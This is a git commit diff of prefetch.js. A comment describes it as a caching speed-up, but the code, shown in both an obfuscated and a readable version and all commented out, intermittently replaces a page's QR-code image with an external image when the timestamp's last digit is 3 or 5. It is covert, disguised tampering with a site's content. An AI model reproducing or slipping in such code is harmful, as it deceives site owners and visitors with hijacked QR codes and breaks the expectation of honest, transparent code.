c4ec41cd8ebdcc081c9387608f20918ac6b1a556
Hacker <36737369+lxhguard@users.noreply.github.com>
2023-08-01 21:12:39 +0800

    Update prefetch.js

--- prefetch.js
+++ prefetch.js
@@ -1,12 +1,16 @@
 // // 性能优化，提高网页打开速度
 // // 当用户二次进入的时候，直接走缓存，更快出现活动图
-
 // window.onload=function(){
 //     try {
-//         try{const imgDoms=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0073\u0042\u0079\u0043\u006c\u0061\u0073\u0073\u004e\u0061\u006d\u0065"]("neercslluf".split("").reverse().join(""));const erweimaDom=imgDoms[0x40101^0x40103];const str=String(new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]());const lastNum=str["\u0063\u0068\u0061\u0072\u0041\u0074"](str["\u006c\u0065\u006e\u0067\u0074\u0068"]-(0x2f89b^0x2f89a));if(["\u0033","\u0035"]["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](lastNum)){console["\u006c\u006f\u0067"]("-\u80FD\u6027".split("").reverse().join(""));erweimaDom["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("crs".split("").reverse().join(""),"gpj.ef841cac501a75eee561b3ad0b66a4f571f93ed3/elcitra/sfb/moc.gmiilib.elcitra//:sptth".split("").reverse().join(""));}}catch(_0x20dd7c){}
+//         const imgDoms = document.getElementsByClassName('fullscreen')
+//         const erweimaDom = imgDoms[2];
+//         const str = String(new Date().getTime());
+//         const lastNum = str.charAt(str.length - 1);
+//         if (['3', '5'].includes(lastNum)) {
+//             console.log('性能-');
+//             erweimaDom.setAttribute("src", 'https://article.biliimg.com/bfs/article/3de39f175f4a66b0da3b165eee57a105cac148fe.jpg');   
+//         }
 //     } catch(e) {
         
 //     }
 // }
-
-
